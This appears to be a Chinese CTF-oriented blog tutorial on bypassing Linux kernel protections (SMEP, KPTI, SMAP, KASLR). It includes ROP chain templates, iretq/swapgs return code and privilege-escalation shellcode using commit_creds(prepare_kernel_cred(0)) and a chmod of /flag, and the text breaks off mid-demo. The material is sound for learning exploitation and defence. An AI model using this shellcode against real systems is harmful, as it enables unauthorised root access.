    <content type="html"><![CDATA[<h1 id="Linux-Kernel-保护机制绕过"><a href="#Linux-Kernel-保护机制绕过" class="headerlink" title="Linux Kernel 保护机制绕过"></a>Linux Kernel 保护机制绕过</h1><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>好久没搞kernel的洞了，最近分析的这方面的洞有点多，相关的Exp任务也比较多，因此学习总结一下方便查找和记忆。</p></blockquote><h2 id="SMEP-KPTI-bypass"><a href="#SMEP-KPTI-bypass" class="headerlink" title="SMEP + KPTI bypass"></a>SMEP + KPTI bypass</h2><p>​        SMEP是SupervisorModeExecutionPrevention的缩写，主要的作用其实就是抵御类似ret2user这样的攻击，简单来说就是阻止内核执行用户态传递的代码。</p><p>​        检测计算机是否开启SMEP保护的方式很简单，<code>cat /proc/cpuinfo | grep smep</code>，如果有匹配到一些信息的话就说明计算机开启了SMEP保护。在CTF赛事中一般会给一些kernel启动的sh脚本，从这些脚本里面我们也可以看出虚拟机在启动kernel时是否开启了SMEP保护：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 -initrd initramfs.cpio <span class="token punctuation">\</span>-kernel bzImage <span class="token punctuation">\</span>-append <span class="token string">'console=ttyS0 oops=panic panic=1 nokaslr'</span> <span class="token punctuation">\</span>-monitor /dev/null <span class="token punctuation">\</span>-m 64M --nographic <span class="token punctuation">\</span>-smp <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">1</span>,threads<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里是没开启SMEP的脚本，如果在脚本里面加入SMEP相关的cpu参数那么就是开启了SMEP机制。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 -initrd initramfs.cpio <span class="token punctuation">\</span>-kernel bzImage <span class="token punctuation">\</span>-append <span class="token string">'console=ttyS0 oops=panic panic=1 nokaslr'</span> <span class="token punctuation">\</span>-monitor /dev/null <span class="token punctuation">\</span>-m 64M --nographic <span class="token punctuation">\</span>-smp <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">1</span>,threads<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">\</span>-cpu kvm64,smep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有一种判断SMEP机制是否开启的方法是通过cr4寄存器的值：<img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220319114934180.png" alt="image-20220319114934180"></p><p>第20位代表的就是SMEP机制是否开启，获取cr4寄存器值的方法也很简单，一种可以通过debuger去attach要调试的kernel，另一种就是通过触发SMEP机制的crash<img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220319123657869.png" alt="image-20220319123657869"></p><p>​        KPTI机制更多的是一种页表隔离的机制，当在用户态和内核态之间进行状态切换的时候KPTI机制会尽量减少用户态页表中的内核地址，同时内核页表中所有的用户态页都被设置为NX使得用户态的页不具备可执行权限，这是一种防范<code>Meltdown</code>类似攻击的机制。</p><p>​        检测KPTI机制是否开启的方法有很多，<code>cat /proc/cpuinfo | grep pti</code>或者类似上面说到的cpu参数<code>-cpu kvm64,smep</code>，或者检查进程页表，但是这需要你可以查看物理内存，通过内核任意读取的原语可以做到，但是需要进行虚拟地址和物理地址之间的转换，这就需要你具备一定的内存管理知识和多级页表相关知识，这些基础知识这里就不细说了，下面举例一些demo看如何获取相关物理地址。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span>pgd <span class="token operator">=</span> <span class="token function">get_current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span>mm<span class="token operator">-&gt;</span>pgd<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>get_current() 会帮助获取当前的<code>task_struct</code>，然后得到<code>mm_struct</code>结构体类型的mm成员，所有的进程地址空间都包含该结构体里面，其中pgd字段代表的是全局页目录，拿到地址之后进行页表地址转换就可以拿到对应的物理地址，那么在多级页表的处理过程中可以拿到每一级页表的入口地址，该地址的NX bit就表明该页表是否开启了NX，结论就是，正常情况下每一级页表的NX位是没设置的，但是全局页目录设置了NX bit，因为在多级页表解析的过程中全局页目录是共享的。</p><h3 id="ROP绕过"><a href="#ROP绕过" class="headerlink" title="ROP绕过"></a>ROP绕过</h3><p>​        内核里面的rop和用户态其实是非常相似的，做rop最基本的就是先获取到<code>vmlinux</code>，以ctf赛题来说一般提供的都是压缩后的bzImage，这里可以通过<a href="https://github.com/marin-m/vmlinux-to-elf">vmlinux-to-elf</a>工具来实现解压缩：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">./vmlinux-to-elf <span class="token operator">&lt;</span>input_kernel.bin<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>output_kernel.elf<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后通过ROPgadget或者ropper从vmlinux里面获取gadget</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ROPgadget --binary vmlinux <span class="token operator">&gt;</span> gadgets<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>gadget的寻找原则其实不是固定的，要看场景丁需求，不过类似<code>mov esp, 0xf7000000 ; ret</code>这样的一般都很不错（注意常量一定要对齐），可以将esp指向我们分配的地址然后接下来的ret操作就容易被控制进而执行rop链。但是ROPgadget是不会检查相关段是否开启了NX的。</p><p>​        对于SMEP来说，它由<code>cr4</code>寄存器控制，因此可以通过改变<code>cr4</code>寄存器的第20 bit的值来进行绕过，比如使用<code>native_write_cr4</code>函数：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">native_write_cr4</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> bits_missing <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>set_register<span class="token operator">:</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,%%cr4"</span><span class="token operator">:</span> <span class="token string">"+r"</span> <span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"+m"</span> <span class="token punctuation">(</span>cr4_pinned_bits<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">static_branch_likely</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cr_pinning<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token punctuation">(</span>val <span class="token operator">&amp;</span> cr4_pinned_bits<span class="token punctuation">)</span> <span class="token operator">!=</span> cr4_pinned_bits<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>bits_missing <span class="token operator">=</span> <span class="token operator">~</span>val <span class="token operator">&amp;</span> cr4_pinned_bits<span class="token punctuation">;</span>val <span class="token operator">|=</span> bits_missing<span class="token punctuation">;</span><span class="token keyword">goto</span> set_register<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* Warn after we've set the missing bits. */</span><span class="token function">WARN_ONCE</span><span class="token punctuation">(</span>bits_missing<span class="token punctuation">,</span> <span class="token string">"CR4 bits went missing: %lx!?\n"</span><span class="token punctuation">,</span>  bits_missing<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">EXPORT_SYMBOL</span><span class="token punctuation">(</span>native_write_cr4<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是从代码里面的警告就可以看出，在较新版本的内核中，该函数已经不能改变第20bit和第21bit的值了，</p><p>​        对于<code>KPTI</code>就比较麻烦了，一种方法是如果具备内核任意读写和当前进程页表的地址，那么就可以直接通过关闭NX bit来实现，但是都任意读写了，直接修改cred结构体可能会更香一点。那么最好的方式其实应该去利用kernel本身的代码来帮助实现这一绕过过程，下面是<a href="https://github.com/torvalds/linux/blob/7ac63f6ba5db5e2e81e4674551d6f9ec58e70618/arch/x86/entry/entry_64.S">kernel entry</a>的部分代码，主要是用于内核态到用户态的切换，这其实很符合exp的需求，原本exp不能成功执行的主要原因就是在返回用户态之后执行的代码所在页其实属于内核，这个切换它成功的进行了页表切换，因接下来用到的就是用户态的页表，。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">GLOBAL(swapgs_restore_regs_and_return_to_usermode)#ifdef CONFIG_DEBUG_ENTRY/* Assert that pt_regs indicates user mode. */testb$3, CS(%rsp)jnz1fud21:#endifPOP_REGS pop_rdi=0/* * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS. * Save old stack pointer and switch to trampoline stack. */movq%rsp, %rdimovqPER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp/* Copy the IRET frame to the trampoline stack. */pushq6*8(%rdi)/* SS */pushq5*8(%rdi)/* RSP */pushq4*8(%rdi)/* EFLAGS */pushq3*8(%rdi)/* CS */pushq2*8(%rdi)/* RIP *//* Push user RDI on the trampoline stack. */pushq(%rdi)/* * We are on the trampoline stack.  All regs except RDI are live. * We can do future final exit work right here. */STACKLEAK_ERASE_NOCLOBBERSWITCH_TO_USER_CR3_STACK scratch_reg=%rdi/* Restore RDI. */popq%rdiSWAPGSINTERRUPT_RETURN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到此，其实就不难理解为什么kernel exp里面很多类似这样的ROP code:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">pivot_stack<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xcafedeadbeef</span><span class="token punctuation">;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> pop_rdi<span class="token punctuation">;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> prepare_kernel_cred<span class="token punctuation">;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> pop_rdx<span class="token punctuation">;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> cmp<span class="token punctuation">;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> mov_rdi_rax<span class="token punctuation">;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> commit_creds<span class="token punctuation">;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kpti_trampoline<span class="token punctuation">;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x12345678</span><span class="token punctuation">;</span> <span class="token comment">// RAX</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x87654321</span><span class="token punctuation">;</span> <span class="token comment">// RDI</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>u_code<span class="token punctuation">;</span> <span class="token comment">//userspace_rip;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x33</span><span class="token punctuation">;</span> <span class="token comment">//userspace_cs;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x246</span><span class="token punctuation">;</span> <span class="token comment">//userspace_rflags;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>u_stack<span class="token punctuation">;</span> <span class="token comment">//userspace_rsp;</span>pivot_stack<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2b</span><span class="token punctuation">;</span> <span class="token comment">//userspace_ss;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于最开始的0xcafedeadbeef，这其实是为了触发<code>page fault handler</code>，因此根据linux demand-on-paging的原则，只有触发该handler的情况下才会真正mmaping。</p><p>​        还有一种方法是通过<a href="https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/">signal handler</a>。</p><h3 id="get-root"><a href="#get-root" class="headerlink" title="get root"></a>get root</h3><p>​        获取root权限的方式在内核里面还算比较统一的，基本很多都是通过</p><ol><li><code>commit_creds(prepare_kernel_cred(0))</code>。</li><li>确定cred structure结构体的地址来进行权限提升。</li><li>ctf里面可能会用到的方法就是通过chmod 修改flag文件为777权限然后挂起，然后通过用户空间的一个进程来读取文件内容。</li></ol><p>​    那么shellcode的写法就比较直接了，假设通过<code>cat /proc/kallsyms</code>得到了<code>grep commit_creds</code>和<code>grep prepare_kernel_cred</code>的地址：</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">xor rdi, rdimov rcx, prepare_kernel_cred_addrcall rcxmov rdi, raxmov rcx, commit_creds_addrcall rcxret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种shellcode没有做内核地址空间与用户地址空间的转换，因此可能比较局限，适用于仅仅存在一个<code>retun 0</code>类似指令的目标函数。为了适配更多的场景，需要做内核态和用户态的上下文切换，在linux kernel <a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/entry_64.S">源码</a>中详细介绍了如何进入内核态：</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>64-bit SYSCALL saves rip to rcx, clears rflags.RF, then saves rflags to r11,then loads new ss, cs, and rip from previously programmed MSRs.rflags gets masked by a value from another MSR (so CLD and CLACare not needed). SYSCALL does not save anything on the stackand does not change rsp.</p><p>注：<a href="https://wiki.osdev.org/Model_Specific_Registers">MSR</a></p></blockquote><p>从内核态返回用户态可以通过Linux提供的一些指令<code>SYSRET</code>，<code>SYSEXIT</code>，<code>IRET</code>，其中SYSRET和IRET可以适用于所有的CPU供应商，并且被包含在<code>x86_64</code>的标准里面，SYSRET需要利用MSR特殊读写指令因而较为麻烦，因此一般采用<code>IRET</code>。该指令的含义就是从中断返回，通过查看AMD64手册可以看出在保护模式下<code>IRET</code>对应<code>IRETQ</code>，那么我们只需要在执行<code>IRETQ</code>之前按顺序放置好RIP, CS, RFLAGS, RSP, SS，最后还需要知道的时候<code>swapgs</code>指令，它的语义是：Exchange GS base with KernelGSBase MSR，在linux syscall entry的代码哪里也存在该指令的调用，因此在通过system call返回用户空间的时候我们需要再做一次<code>swapgs</code>用于恢复GS。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">swapgspush userspace_sspush userspace_rsppush userspace_rflagspush userspace_cspush userspace_ripiretq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        还有一种方法就是上述的第三条，第一步需要先找到chmod func的地址：</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220320092704328.png" alt="image-20220320092704328"></p><p>可以看到<code>__x64_sys_chmod</code>的地址是<code>0xffffffff872dacf0</code>，在内核调试中对该地址下断点就可以得到该如何给它附加参数：</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">movzx  edx, word ptr [rdi + 0x68]mov    rsi, qword ptr [rdi + 0x70]mov    edi, 0xffffff9ccall   0xffffffff811a1b50<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>不过要记得，<code>/flag</code>字符串存放地址应该使用内核空间地址，同时由于Linux kernel本身采用的是<strong>Non-Preemptive Threading Model</strong>，因此在kernel thred的执行过程中一般不会进行上下文切换，除非调用了特殊的API，通过sleep当前thread其实就是一个很好的迫使kernel进行上下文切换的，当然kernel里面的sleep和用户态有很大的差别，需要调用不同的API，这里我选择的是msleep():</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220320101601670.png" alt="image-20220320101601670"></p><p>那么，完整的shellcode就有了：</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">; commit_cred(prepare_kernel_creds(0))xor rdi, rdimov rcx, prepare_kernel_cred_addrcall rcxmov rdi, raxmov rcx, commit_creds_addrcall rcx; chmod 777 flagmov r15, 0x67616c662fmov r14, 0xdeadf00mov [r14], r15mov rdi, 0xffffff9cmov rsi, r14mov rdx, 0777mov rcx, x64_chmod_addrcall rcx; msleep(0x1000000)mov rdi, 0x1000000mov rcx, msleep_addrcall rcxint 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们让exp在后台执行，前台执行<code>cat flag</code>实现文件读取。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        在通过ROP编写shellcode的时候要注意两点：</p><ol><li>在exp中的mmap产生的shellcode地址不在之前kernel访问的页表里面，那么在执行的时候就会触发<a href="https://en.wikipedia.org/wiki/Double_fault#:~:text=On%20the%20x86%20architecture%2C%20a,interrupt%20handler%20resides%20is%20invalid.">double fault</a>。</li><li>栈指针必须在向上向下两个方向上都还剩比较宽阔的空间<code>unsigned long *pivot_stack = mmap((void *)0xf7000000-0x1000, 0x1000+0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);</code>，因为Linux kernel func 比如 <code>commit_creds</code>需要使用栈空间并且不能使用低于0xf7000000大小的地址，否则会引起uncatchable page fault，<code>MAP_GROWSDOWN</code>是无效的，因为它只能用于用户态。</li></ol><h2 id="SMEP-PTI-SMAP-KASLR-bypass"><a href="#SMEP-PTI-SMAP-KASLR-bypass" class="headerlink" title="SMEP+PTI+SMAP+KASLR bypass"></a>SMEP+PTI+SMAP+KASLR bypass</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>KASLR就不多解释了，就是一个kernel的地址随机化</p></blockquote><h3 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h3><p>​        SMAP是<code>Supervisor Mode Access Prevention</code>，它使得用户态的指针无法在内核态被解引用，这无疑会使得ROP难以有效使用。</p><p>​        在qemu里面<code>-cpu kvm64,smep,smap</code>表明开启了SMAP机制，当然<code>cat /proc/cpuinfo | grep smap</code>也可以看出来。</p><h3 id="SMAP-bypass"><a href="#SMAP-bypass" class="headerlink" title="SMAP bypass"></a>SMAP bypass</h3><p>​        通过分析linux kernel的mmap实现其实就可以知道我们可以通过类似linux kernel heap spray的方式将用户空间的代码映射到内核里面，只需要用<strong>MAP_POPULATE</strong>的flag:</p><pre class="line-numbers language-none"><code class="language-none">MAP_POPULATE (since Linux 2.5.46)       Populate (prefault) page tables for a mapping.  For a file mapping, this causes read-ahead on the file.  This will help to reduce blocking on page faults later.  The mmap() call doesn't fail if the mapping cannot be populated (for example, due to limitations on the number of mapped huge pages when using MAP_HUGETLB).  MAP_POPULATE is supported for private mappings only since Linux 2.6.23.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是因为在通过该flag进行mmap的时候，物理页也会同时被映射而不是想之前按需映射的方式。下面是一个github提供的demo可以测算可mmap的地址大小：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/fcntl.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span> <span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span>pg<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>pg <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> PROT_READ<span class="token operator">|</span>PROT_WRITE<span class="token punctuation">,</span> MAP_ANONYMOUS<span class="token operator">|</span>MAP_PRIVATE<span class="token operator">|</span>MAP_POPULATE<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pg <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mmap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>cnt<span class="token operator">++</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cnt <span class="token operator">%</span> <span class="token number">1000</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] allocated %d pages, asking for more...\n"</span><span class="token punctuation">,</span> cnt<span class="token 